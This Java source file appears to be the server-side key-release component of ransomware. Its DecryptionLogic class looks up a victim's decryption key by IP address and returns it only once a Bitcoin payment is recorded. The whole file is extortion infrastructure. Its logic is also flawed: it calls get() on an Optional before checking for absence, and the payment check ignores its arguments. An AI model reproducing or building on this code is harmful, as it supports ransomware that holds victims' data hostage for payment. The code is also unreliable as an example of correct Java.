package server.bl;

import java.util.Optional;

import javax.inject.Inject;

import Payment.PaymentProcess;
import server.entities.Bitcoin;
import server.entities.CryptoKey;
import server.exceptions.KeyNotFoundException;
import server.exceptions.PaymentNotFoundException;
import server.repositories.KeyRepository;

public class DecryptionLogic {

	@Inject
	private KeyRepository repository;

	public  CryptoKey returnKey(String ip, Bitcoin btc) throws PaymentNotFoundException, KeyNotFoundException {
		PaymentProcess clientPayment = new PaymentProcess();
		if (clientPayment.isPaid()) {
			Optional<CryptoKey> key = repository.findById(ip);
			if (key.get() != null) {
				return key.get();
			} else {
				throw new KeyNotFoundException();
			}

		}
		throw new PaymentNotFoundException();
	}
}
